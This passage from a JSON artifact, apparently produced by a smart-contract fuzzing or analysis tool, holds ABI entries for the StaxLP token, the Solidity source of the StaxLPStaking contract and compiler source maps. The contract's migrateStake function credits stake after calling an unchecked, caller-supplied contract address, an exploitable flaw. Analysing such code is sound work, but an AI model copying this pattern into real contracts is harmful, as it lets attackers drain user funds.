sInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:increaseAllowance(address,uint256)(bool)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"increaseAllowance(address,uint256):(bool)","shortSignature":"39509351","name":"increaseAllowance","inputs":[{"name":"spender","kind":"Address","internalType":"address"},{"name":"addedValue","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:mint(address,uint256)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"mint(address,uint256)","shortSignature":"40c10f19","name":"mint","inputs":[{"name":"_to","kind":"Address","internalType":"address"},{"name":"_amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:name()(string)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"name():(string)","shortSignature":"06fdde03","name":"name","inputs":[],"outputs":[{"name":"","kind":"String","internalType":"string"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:owner()(address)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"owner():(address)","shortSignature":"8da5cb5b","name":"owner","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"address"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:removeMinter(address)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"removeMinter(address)","shortSignature":"3092afd5","name":"removeMinter","inputs":[{"name":"_account","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:renounceOwnership()","contractId":"contracts/StaxLP.sol:StaxLP","signature":"renounceOwnership()","shortSignature":"715018a6","name":"renounceOwnership","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:renounceRole(bytes32,address)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"renounceRole(bytes32,address)","shortSignature":"36568abe","name":"renounceRole","inputs":[{"name":"role","kind":{"FixedBytes":32},"internalType":"bytes32"},{"name":"account","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:revokeRole(bytes32,address)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"revokeRole(bytes32,address)","shortSignature":"d547741f","name":"revokeRole","inputs":[{"name":"role","kind":{"FixedBytes":32},"internalType":"bytes32"},{"name":"account","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:supportsInterface(bytes4)(bool)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"supportsInterface(bytes4):(bool)","shortSignature":"01ffc9a7","name":"supportsInterface","inputs":[{"name":"interfaceId","kind":{"FixedBytes":4},"internalType":"bytes4"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:symbol()(string)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"symbol():(string)","shortSignature":"95d89b41","name":"symbol","inputs":[],"outputs":[{"name":"","kind":"String","internalType":"string"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:totalSupply()(uint256)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"totalSupply():(uint256)","shortSignature":"18160ddd","name":"totalSupply","inputs":[],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:transfer(address,uint256)(bool)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"transfer(address,uint256):(bool)","shortSignature":"a9059cbb","name":"transfer","inputs":[{"name":"to","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:transferFrom(address,address,uint256)(bool)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"transferFrom(address,address,uint256):(bool)","shortSignature":"23b872dd","name":"transferFrom","inputs":[{"name":"from","kind":"Address","internalType":"address"},{"name":"to","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"contracts/StaxLP.sol:StaxLP:transferOwnership(address)","contractId":"contracts/StaxLP.sol:StaxLP","signature":"transferOwnership(address)","shortSignature":"f2fde38b","name":"transferOwnership","inputs":[{"name":"newOwner","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[0,8,9,17,18,19,22,23,24,27,28,31,32]},{"name":"StaxLPStaking","artifactPath":"out/StaxLPStaking.sol/StaxLPStaking.json","sourcePath":"contracts/StaxLPStaking.sol","contractId":"contracts/StaxLPStaking.sol:StaxLPStaking","sourceFileId":1,"sourceContent":"pragma solidity ^0.8.4;\n// SPDX-License-Identifier: AGPL-3.0-or-later\n\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n\n/**\n* Based on synthetix BaseRewardPool.sol & convex cvxLocker\n* Modified for use by TempleDAO \n*/\n\ncontract StaxLPStaking is Ownable {\n\n    using SafeERC20 for IERC20;\n\n    IERC20 public stakingToken;\n    address public rewardDistributor;\n\n    uint256 public constant DURATION = 86400 * 7;\n    uint256 private _totalSupply;\n\n    address[] public rewardTokens;\n\n    mapping(address => uint256) private _balances;\n    mapping(address => Reward) public rewardData;\n    mapping(address => mapping(address => uint256)) public claimableRewards;\n    mapping(address => mapping(address => uint256)) public userRewardPerTokenPaid;\n\n    /// @dev For use when migrating to a new staking contract.\n    address public migrator;\n\n    struct Reward {\n        uint40 periodFinish;\n        uint216 rewardRate;  // The reward amount (1e18) per total reward duration\n        uint40 lastUpdateTime;\n        uint216 rewardPerTokenStored;\n    }\n\n    event RewardAdded(address token, uint256 amount);\n    event Staked(address indexed user, uint256 amount);\n    event Withdrawn(address indexed user, address toAddress, uint256 amount);\n    event RewardPaid(address indexed user, address toAddress, address rewardToken, uint256 reward);\n    event UpdatedRewardDistributor(address distributor);\n    event MigratorSet(address migrator);\n\n    constructor(address _stakingToken, address _distributor) {\n        stakingToken = IERC20(_stakingToken);\n        rewardDistributor = _distributor;\n    }\n\n    // set distributor of rewards\n    function setRewardDistributor(address _distributor) external onlyOwner {\n        rewardDistributor = _distributor;\n\n        emit UpdatedRewardDistributor(_distributor);\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function addReward(address _rewardToken) external onlyOwner {\n        require(rewardData[_rewardToken].lastUpdateTime == 0, \"exists\");\n        rewardTokens.push(_rewardToken);\n        rewardData[_rewardToken].lastUpdateTime = uint40(block.timestamp);\n        rewardData[_rewardToken].periodFinish = uint40(block.timestamp);\n    }\n\n    function _rewardPerToken(address _rewardsToken) internal view returns (uint256) {\n        if (totalSupply() == 0) {\n            return rewardData[_rewardsToken].rewardPerTokenStored;\n        }\n\n        return\n            rewardData[_rewardsToken].rewardPerTokenStored +\n            (((_lastTimeRewardApplicable(rewardData[_rewardsToken].periodFinish) -\n                rewardData[_rewardsToken].lastUpdateTime) *\n                rewardData[_rewardsToken].rewardRate * 1e18)\n                / totalSupply());\n    }\n\n    function rewardPerToken(address _rewardsToken) external view returns (uint256) {\n        return _rewardPerToken(_rewardsToken);\n    }\n\n    function rewardPeriodFinish(address _token) external view returns (uint40) {\n        return rewardData[_token].periodFinish;\n    }\n\n    function earned(address _account, address _rewardsToken) external view returns (uint256) {\n        return _earned(_account, _rewardsToken, _balances[_account]);\n    }\n\n    function _earned(\n        address _account,\n        address _rewardsToken,\n        uint256 _balance\n    ) internal view returns (uint256) {\n        return\n            (_balance * (_rewardPerToken(_rewardsToken) - userRewardPerTokenPaid[_account][_rewardsToken])) / 1e18 +\n            claimableRewards[_account][_rewardsToken];\n    }\n\n    function stake(uint256 _amount) external {\n        stakeFor(msg.sender, _amount);\n    }\n\n    function stakeAll() external {\n        uint256 balance = stakingToken.balanceOf(msg.sender);\n        stakeFor(msg.sender, balance);\n    }\n\n    function stakeFor(address _for, uint256 _amount) public {\n        require(_amount > 0, \"Cannot stake 0\");\n        \n        // pull tokens and apply stake\n        stakingToken.safeTransferFrom(msg.sender, address(this), _amount);\n        _applyStake(_for, _amount);\n    }\n\n    function _applyStake(address _for, uint256 _amount) internal updateReward(_for) {\n        _totalSupply += _amount;\n        _balances[_for] += _amount;\n        emit Staked(_for, _amount);\n    }\n\n    function _withdrawFor(\n        address staker,\n        address toAddress,\n        uint256 amount,\n        bool claimRewards,\n        address rewardsToAddress\n    ) internal updateReward(staker) {\n        require(amount > 0, \"Cannot withdraw 0\");\n        require(_balances[staker] >= amount, \"Not enough staked tokens\");\n\n        _totalSupply -= amount;\n        _balances[staker] -= amount;\n\n        stakingToken.safeTransfer(toAddress, amount);\n        emit Withdrawn(staker, toAddress, amount);\n     \n        if (claimRewards) {\n            // can call internal because user reward already updated\n            _getRewards(staker, rewardsToAddress);\n        }\n    }\n\n    function withdraw(uint256 amount, bool claim) public {\n        _withdrawFor(msg.sender, msg.sender, amount, claim, msg.sender);\n    }\n\n    function withdrawAll(bool claim) external {\n        _withdrawFor(msg.sender, msg.sender, _balances[msg.sender], claim, msg.sender);\n    }\n\n    function getRewards(address staker) external updateReward(staker) {\n        _getRewards(staker, staker);\n    }\n\n    // @dev internal function. make sure to call only after updateReward(account)\n    function _getRewards(address staker, address rewardsToAddress) internal {\n        for (uint256 i; i < rewardTokens.length; i++) {\n            _getReward(staker, rewardTokens[i], rewardsToAddress);\n        }\n    }\n\n    function getReward(address staker, address rewardToken) external updateReward(staker) {\n        _getReward(staker, rewardToken, staker);\n    }\n\n    function _getReward(address staker, address rewardToken, address rewardsToAddress) internal {\n        uint256 amount = claimableRewards[staker][rewardToken];\n        if (amount > 0) {\n            claimableRewards[staker][rewardToken] = 0;\n            IERC20(rewardToken).safeTransfer(rewardsToAddress, amount);\n\n            emit RewardPaid(staker, rewardsToAddress, rewardToken, amount);\n        }\n    }\n\n    function _lastTimeRewardApplicable(uint256 _finishTime) internal view returns (uint256) {\n        if (_finishTime < block.timestamp) {\n            return _finishTime;\n        }\n        return block.timestamp;\n    }\n\n    function _notifyReward(address _rewardsToken, uint256 _amount) internal {\n        Reward storage rdata = rewardData[_rewardsToken];\n\n        if (block.timestamp >= rdata.periodFinish) {\n            rdata.rewardRate = uint216(_amount / DURATION);\n        } else {\n            uint256 remaining = uint256(rdata.periodFinish) - block.timestamp;\n            uint256 leftover = remaining * rdata.rewardRate;\n            rdata.rewardRate = uint216((_amount + leftover) / DURATION);\n        }\n\n        rdata.lastUpdateTime = uint40(block.timestamp);\n        rdata.periodFinish = uint40(block.timestamp + DURATION);\n    }\n\n    function notifyRewardAmount(\n        address _rewardsToken,\n        uint256 _amount\n    ) external updateReward(address(0)) {\n        require(msg.sender == rewardDistributor, \"not distributor\");\n        require(_amount > 0, \"No reward\");\n        require(rewardData[_rewardsToken].lastUpdateTime != 0, \"unknown reward token\");\n        \n        _notifyReward(_rewardsToken, _amount);\n\n        IERC20(_rewardsToken).safeTransferFrom(msg.sender, address(this), _amount);\n\n        emit RewardAdded(_rewardsToken, _amount);\n    }\n\n    function setMigrator(address _migrator) external onlyOwner {\n        migrator = _migrator;\n        emit MigratorSet(_migrator);\n    }\n\n    /**\n      * @notice For migrations to a new staking contract:\n      *         1. User/DApp checks if the user has a balance in the `oldStakingContract`\n      *         2. If yes, user calls this function `newStakingContract.migrateStake(oldStakingContract, balance)`\n      *         3. Staking balances are migrated to the new contract, user will start to earn rewards in the new contract.\n      *         4. Any claimable rewards in the old contract are sent directly to the user's wallet.\n      * @param oldStaking The old staking contract funds are being migrated from.\n      * @param amount The amount to migrate - generally this would be the staker's balance\n      */\n    function migrateStake(address oldStaking, uint256 amount) external {\n        StaxLPStaking(oldStaking).migrateWithdraw(msg.sender, amount);\n        _applyStake(msg.sender, amount);\n    }\n\n    /**\n      * @notice For migrations to a new staking contract.\n      *         1. Withdraw `staker`s tokens to the new staking contract (the migrator)\n      *         2. Any existing rewards are claimed and sent directly to the `staker`\n      * @dev Called only from the new staking contract (the migrator).\n      *      `setMigrator(new_staking_contract)` needs to be called first\n      * @param staker The staker who is being migrated to a new staking contract.\n      * @param amount The amount to migrate - generally this would be the staker's balance\n      */\n    function migrateWithdraw(address staker, uint256 amount) external onlyMigrator {\n        _withdrawFor(staker, msg.sender, amount, true, staker);\n    }\n\n    modifier onlyMigrator() {\n        require(msg.sender == migrator, \"not migrator\");\n        _;\n    }\n\n    modifier updateReward(address _account) {\n        {\n            // stack too deep\n            for (uint256 i = 0; i < rewardTokens.length; i++) {\n                address token = rewardTokens[i];\n                rewardData[token].rewardPerTokenStored = uint216(_rewardPerToken(token));\n                rewardData[token].lastUpdateTime = uint40(_lastTimeRewardApplicable(rewardData[token].periodFinish));\n                if (_account != address(0)) {\n                    claimableRewards[_account][token] = _earned(_account, token, _balances[_account]);\n                    userRewardPerTokenPaid[_account][token] = uint256(rewardData[token].rewardPerTokenStored);\n                }\n            }\n        }\n        _;\n    }\n}","sourceMap":"406:9999:1:-:0;;;1622:152;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;936:32:4;719:10:11;936:18:4;:32::i;:::-;1689:12:1;:36;;-1:-1:-1;;;;;1689:36:1;;;-1:-1:-1;;;;;;1689:36:1;;;;;;;1735:17;:32;;;;;;;;;;;406:9999;;2433:187:4;2506:16;2525:6;;-1:-1:-1;;;;;2541:17:4;;;-1:-1:-1;;;;;;2541:17:4;;;;;;2573:40;;2525:6;;;;;;;2573:40;;2506:16;2573:40;2496:124;2433:187;:::o;14:177:29:-;93:13;;-1:-1:-1;;;;;135:31:29;;125:42;;115:70;;181:1;178;171:12;115:70;14:177;;;:::o;196:293::-;275:6;283;336:2;324:9;315:7;311:23;307:32;304:52;;;352:1;349;342:12;304:52;375:40;405:9;375:40;:::i;:::-;365:50;;434:49;479:2;468:9;464:18;434:49;:::i;:::-;424:59;;196:293;;;;;:::o;:::-;406:9999:1;;;;;;","sourceMapDeployed":"406:9999:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1994:89;2064:12;;1994:89;;;160:25:29;;;148:2;133:18;1994:89:1;;;;;;;;551:44;;586:9;551:44;;5362:137;;;;;;:::i;:::-;;:::i;:::-;;3332:166;;;;;;:::i;:::-;;:::i;7846:133::-;;;;;;:::i;:::-;;:::i;3196:130::-;;;;;;:::i;:::-;-1:-1:-1;;;;;3288:18:1;3263:6;3288:18;;;:10;:18;;;;;:31;;;;3196:130;;;;1373:12:29;1361:25;;;1343:44;;1331:2;1316:18;3196:130:1;1199:194:29;4078:270:1;;;;;;:::i;:::-;;:::i;5223:133::-;;;;;;:::i;:::-;;:::i;9421:150::-;;;;;;:::i;:::-;;:::i;723:44::-;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;;;;723:44:1;;;;;;;;;;;;;;;;;;;;;;2208:12:29;2247:15;;;2229:34;;-1:-1:-1;;;;;2337:15:29;;;2332:2;2317:18;;2310:43;2389:15;;;;2369:18;;;2362:43;;;;2441:15;2436:2;2421:18;;2414:43;2185:3;2170:19;723:44:1;1971:492:29;5921:142:1;;;;;;:::i;:::-;;:::i;773:71::-;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;850:77;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;2089:108;;;;;;:::i;:::-;-1:-1:-1;;;;;2172:18:1;2146:7;2172:18;;;:9;:18;;;;;;;2089:108;1831:101:4;;;:::i;480:26:1:-;;;;;-1:-1:-1;;;;;480:26:1;;;;;;-1:-1:-1;;;;;2647:32:29;;;2629:51;;2617:2;2602:18;480:26:1;2468:218:29;5505:110:1;;;;;;:::i;:::-;;:::i;636:29::-;;;;;;:::i;:::-;;:::i;997:23::-;;;;;-1:-1:-1;;;;;997:23:1;;;1201:85:4;1247:7;1273:6;-1:-1:-1;;;;;1273:6:4;1201:85;;3935:137:1;;;:::i;2203:329::-;;;;;;:::i;:::-;;:::i;1814:174::-;;;;;;:::i;:::-;;:::i;3842:87::-;;;;;;:::i;:::-;;:::i;512:32::-;;;;;-1:-1:-1;;;;;512:32:1;;;7317:523;;;;;;:::i;:::-;;:::i;8662:186::-;;;;;;:::i;:::-;;:::i;3057:133::-;;;;;;:::i;:::-;;:::i;2081:198:4:-;;;;;;:::i;:::-;;:::i;5362:137:1:-;5427:10;5451:21;;;;:9;:21;;;;;;5414:78;;5427:10;;;5474:5;5427:10;5414:12;:78::i;:::-;5362:137;:::o;3332:166::-;-1:-1:-1;;;;;3471:19:1;;3412:7;3471:19;;;:9;:19;;;;;;3438:53;;3446:8;;3456:13;;3438:7;:53::i;:::-;3431:60;;3332:166;;;;;:::o;7846:133::-;1094:13:4;:11;:13::i;:::-;7915:8:1::1;:20:::0;;-1:-1:-1;;;;;;7915:20:1::1;-1:-1:-1::0;;;;;7915:20:1;::::1;::::0;;::::1;::::0;;;7950:22:::1;::::0;2629:51:29;;;7950:22:1::1;::::0;2617:2:29;2602:18;7950:22:1::1;;;;;;;;7846:133:::0;:::o;4078:270::-;4162:1;4152:7;:11;4144:38;;;;-1:-1:-1;;;4144:38:1;;3286:2:29;4144:38:1;;;3268:21:29;3325:2;3305:18;;;3298:30;-1:-1:-1;;;3344:18:29;;;3337:44;3398:18;;4144:38:1;;;;;;;;;4240:12;;:65;;-1:-1:-1;;;;;4240:12:1;4270:10;4290:4;4297:7;4240:29;:65::i;:::-;4315:26;4327:4;4333:7;4315:11;:26::i;:::-;4078:270;;:::o;5223:133::-;5286:63;5299:10;5311;5323:6;5331:5;5338:10;5286:12;:63::i;9421:150::-;9633:8;;-1:-1:-1;;;;;9633:8:1;9619:10;:22;9611:47;;;;-1:-1:-1;;;9611:47:1;;3629:2:29;9611:47:1;;;3611:21:29;3668:2;3648:18;;;3641:30;-1:-1:-1;;;3687:18:29;;;3680:42;3739:18;;9611:47:1;3427:336:29;9611:47:1;9510:54:::1;9523:6;9531:10;9543:6;9551:4;9557:6;9510:12;:54::i;5921:142::-:0;5999:6;9781:9;9776:600;9800:12;:19;9796:23;;9776:600;;;9844:13;9860:12;9873:1;9860:15;;;;;;;;:::i;:::-;;;;;;;;;;;-1:-1:-1;;;;;9860:15:1;;-1:-1:-1;9942:22:1;9860:15;9942;:22::i;:::-;-1:-1:-1;;;;;9893:17:1;;;;;;:10;:17;;;;;:38;;;:72;;-1:-1:-1;;;;;9893:72:1;;;;-1:-1:-1;;;9893:72:1;;;;;;;;10051:30;10025:57;;10051:30;10025:25;:57::i;:::-;-1:-1:-1;;;;;9983:17:1;;;;;;;:10;:17;;;;;:32;;:100;;-1:-1:-1;;9983:100:1;;;;;;;;;;;;;10105:22;;;10101:261;;-1:-1:-1;;;;;10212:19:1;;;;;;:9;:19;;;;;;10187:45;;10195:8;;10205:5;;10187:7;:45::i;:::-;-1:-1:-1;;;;;10151:26:1;;;;;;;:16;:26;;;;;;;;:33;;;;;;;;;;;;:81;;;;10304:10;:17;;;;;:38;;;10254:32;;;:22;:32;;;;;:39;;;;;;;;;;-1:-1:-1;;;10304:38:1;;;-1:-1:-1;;;;;10304:38:1;10254:89;;10101:261;-1:-1:-1;9821:3:1;;;;:::i;:::-;;;;9776:600;;;;6017:39:::1;6028:6;6036:11;6049:6;6017:10;:39::i;:::-;5921:142:::0;;;:::o;1831:101:4:-;1094:13;:11;:13::i;:::-;1895:30:::1;1922:1;1895:18;:30::i;:::-;1831:101::o:0;5505:110:1:-;5563:6;9781:9;9776:600;9800:12;:19;9796:23;;9776:600;;;9844:13;9860:12;9873:1;9860:15;;;;;;;;:::i;:::-;;;;;;;;;;;-1:-1:-1;;;;;9860:15:1;;-1:-1:-1;9942:22:1;9860:15;9942;:22::i;:::-;-1:-1:-1;;;;;9893:17:1;;;;;;:10;:17;;;;;:38;;;:72;;-1:-1:-1;;;;;9893:72:1;;;;-1:-1:-1;;;9893:72:1;;;;;;;;10051:30;10025:57;;10051:30;10025:25;:57::i;:::-;-1:-1:-1;;;;;9983:17:1;;;;;;;:10;:17;;;;;:32;;:100;;-1:-1:-1;;9983:100:1;;;;;;;;;;;;;10105:22;;;10101:261;;-1:-1:-1;;;;;10212:19:1;;;;;;:9;:19;;;;;;10187:45;;10195:8;;10205:5;;10187:7;:45::i;:::-;-1:-1:-1;;;;;10151:26:1;;;;;;;:16;:26;;;;;;;;:33;;;;;;;;;;;;:81;;;;10304:10;:17;;;;;:38;;;10254:32;;;:22;:32;;;;;:39;;;;;;;;;;-1:-1:-1;;;10304:38:1;;;-1:-1:-1;;;;;10304:38:1;10254:89;;10101:261;-1:-1:-1;9821:3:1;;;;:::i;:::-;;;;9776:600;;;;5581:27:::1;5593:6;5601;5581:11;:27::i;636:29::-:0;;;;;;;;;;;;;;;;;;;;;;;-1:-1:-1;;;;;636:29:1;;-1:-1:-1;636:29:1;:::o;3935:137::-;3992:12;;:34;;-1:-1:-1;;;3992:34:1;;4015:10;3992:34;;;2629:51:29;3974:15:1;;-1:-1:-1;;;;;3992:12:1;;:22;;2602:18:29;;3992:34:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;3974:52;;4036:29;4045:10;4057:7;4036:8;:29::i;2203:329::-;1094:13:4;:11;:13::i;:::-;-1:-1:-1;;;;;2281:24:1;::::1;;::::0;;;:10:::1;:24;::::0;;;;:39:::1;;::::0;::::1;;:44:::0;2273:63:::1;;;::::0;-1:-1:-1;;;2273:63:1;;4563:2:29;2273:63:1::1;::::0;::::1;4545:21:29::0;4602:1;4582:18;;;4575:29;-1:-1:-1;;;4620:18:29;;;4613:36;4666:18;;2273:63:1::1;4361:329:29::0;2273:63:1::1;2346:12;:31:::0;;::::1;::::0;;::::1;::::0;;;;::::1;::::0;;-1:-1:-1;;;;;2346:31:1;;::::1;-1:-1:-1::0;;;;;;2346:31:1;;::::1;::::0;::::1;::::0;;-1:-1:-1;2387:24:1;;;:10:::1;2346:31;2387:24:::0;;;;;:39;;::::1;:65:::0;;::::1;2436:15;2387:65;-1:-1:-1::0;;2387:65:1;;::::1;::::0;::::1;::::0;;;2462:63;;::::1;;::::0;;2203:329::o;1814:174::-;1094:13:4;:11;:13::i;:::-;1895:17:1::1;:32:::0;;-1:-1:-1;;;;;;1895:32:1::1;-1:-1:-1::0;;;;;1895:32:1;::::1;::::0;;::::1;::::0;;;1943:38:::1;::::0;2629:51:29;;;1943:38:1::1;::::0;2617:2:29;2602:18;1943:38:1::1;2468:218:29::0;3842:87:1;3893:29;3902:10;3914:7;3893:8;:29::i;7317:523::-;7437:1;;9776:600;9800:12;:19;9796:23;;9776:600;;;9844:13;9860:12;9873:1;9860:15;;;;;;;;:::i;:::-;;;;;;;;;;;-1:-1:-1;;;;;9860:15:1;;-1:-1:-1;9942:22:1;9860:15;9942;:22::i;:::-;-1:-1:-1;;;;;9893:17:1;;;;;;:10;:17;;;;;:38;;;:72;;-1:-1:-1;;;;;9893:72:1;;;;-1:-1:-1;;;9893:72:1;;;;;;;;10051:30;10025:57;;10051:30;10025:25;:57::i;:::-;-1:-1:-1;;;;;9983:17:1;;;;;;;:10;:17;;;;;:32;;:100;;-1:-1:-1;;9983:100:1;;;;;;;;;;;;;10105:22;;;10101:261;;-1:-1:-1;;;;;10212:19:1;;;;;;:9;:19;;;;;;10187:45;;10195:8;;10205:5;;10187:7;:45::i;:::-;-1:-1:-1;;;;;10151:26:1;;;;;;;:16;:26;;;;;;;;:33;;;;;;;;;;;;:81;;;;10304:10;:17;;;;;:38;;;10254:32;;;:22;:32;;;;;:39;;;;;;;;;;-1:-1:-1;;;10304:38:1;;;-1:-1:-1;;;;;10304:38:1;10254:89;;10101:261;-1:-1:-1;9821:3:1;;;;:::i;:::-;;;;9776:600;;;-1:-1:-1;7473:17:1::1;::::0;-1:-1:-1;;;;;7473:17:1::1;7459:10;:31;7451:59;;;::::0;-1:-1:-1;;;7451:59:1;;4897:2:29;7451:59:1::1;::::0;::::1;4879:21:29::0;4936:2;4916:18;;;4909:30;-1:-1:-1;;;4955:18:29;;;4948:45;5010:18;;7451:59:1::1;4695:339:29::0;7451:59:1::1;7538:1;7528:7;:11;7520:33;;;::::0;-1:-1:-1;;;7520:33:1;;5241:2:29;7520:33:1::1;::::0;::::1;5223:21:29::0;5280:1;5260:18;;;5253:29;-1:-1:-1;;;5298:18:29;;;5291:39;5347:18;;7520:33:1::1;5039:332:29::0;7520:33:1::1;-1:-1:-1::0;;;;;7571:25:1;::::1;;::::0;;;:10:::1;:25;::::0;;;;:40:::1;;::::0;::::1;;:45:::0;;7563:78:::1;;;::::0;-1:-1:-1;;;7563:78:1;;5578:2:29;7563:78:1::1;::::0;::::1;5560:21:29::0;5617:2;5597:18;;;5590:30;-1:-1:-1;;;5636:18:29;;;5629:50;5696:18;;7563:78:1::1;5376:344:29::0;7563:78:1::1;7660:37;7674:13;7689:7;7660:13;:37::i;:::-;7708:74;-1:-1:-1::0;;;;;7708:38:1;::::1;7747:10;7767:4;7774:7:::0;7708:38:::1;:74::i;:::-;7798:35;::::0;;-1:-1:-1;;;;;5917:32:29;;5899:51;;5981:2;5966:18;;5959:34;;;7798:35:1::1;::::0;5872:18:29;7798:35:1::1;;;;;;;7317:523:::0;;;:::o;8662:186::-;8739:61;;-1:-1:-1;;;8739:61:1;;8781:10;8739:61;;;5899:51:29;5966:18;;;5959:34;;;-1:-1:-1;;;;;8739:41:1;;;;;5872:18:29;;8739:61:1;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8810:31;8822:10;8834:6;8810:11;:31::i;3057:133::-;3127:7;3153:30;3169:13;3153:15;:30::i;2081:198:4:-;1094:13;:11;:13::i;:::-;-1:-1:-1;;;;;2169:22:4;::::1;2161:73;;;::::0;-1:-1:-1;;;2161:73:4;;6206:2:29;2161:73:4::1;::::0;::::1;6188:21:29::0;6245:2;6225:18;;;6218:30;6284:34;6264:18;;;6257:62;-1:-1:-1;;;6335:18:29;;;6328:36;6381:19;;2161:73:4::1;6004:402:29::0;2161:73:4::1;2244:28;2263:8;2244:18;:28::i;4552:665:1:-:0;4738:6;9781:9;9776:600;9800:12;:19;9796:23;;9776:600;;;9844:13;9860:12;9873:1;9860:15;;;;;;;;:::i;:::-;;;;;;;;;;;-1:-1:-1;;;;;9860:15:1;;-1:-1:-1;9942:22:1;9860:15;9942;:22::i;:::-;-1:-1:-1;;;;;9893:17:1;;;;;;:10;:17;;;;;:38;;;:72;;-1:-1:-1;;;;;9893:72:1;;;;-1:-1:-1;;;9893:72:1;;;;;;;;10051:30;10025:57;;10051:30;10025:25;:57::i;:::-;-1:-1:-1;;;;;9983:17:1;;;;;;;:10;:17;;;;;:32;;:100;;-1:-1:-1;;9983:100:1;;;;;;;;;;;;;10105:22;;;10101:261;;-1:-1:-1;;;;;10212:19:1;;;;;;:9;:19;;;;;;10187:45;;10195:8;;10205:5;;10187:7;:45::i;:::-;-1:-1:-1;;;;;10151:26:1;;;;;;;:16;:26;;;;;;;;:33;;;;;;;;;;;;:81;;;;10304:10;:17;;;;;:38;;;10254:32;;;:22;:32;;;;;:39;;;;;;;;;;-1:-1:-1;;;10304:38:1;;;-1:-1:-1;;;;;10304:38:1;10254:89;;10101:261;-1:-1:-1;9821:3:1;;;;:::i;:::-;;;;9776:600;;;;4773:1:::1;4764:6;:10;4756:40;;;::::0;-1:-1:-1;;;4756:40:1;;6613:2:29;4756:40:1::1;::::0;::::1;6595:21:29::0;6652:2;6632:18;;;6625:30;-1:-1:-1;;;6671:18:29;;;6664:47;6728:18;;4756:40:1::1;6411:341:29::0;4756:40:1::1;-1:-1:-1::0;;;;;4814:17:1;::::1;;::::0;;;:9:::1;:17;::::0;;;;;: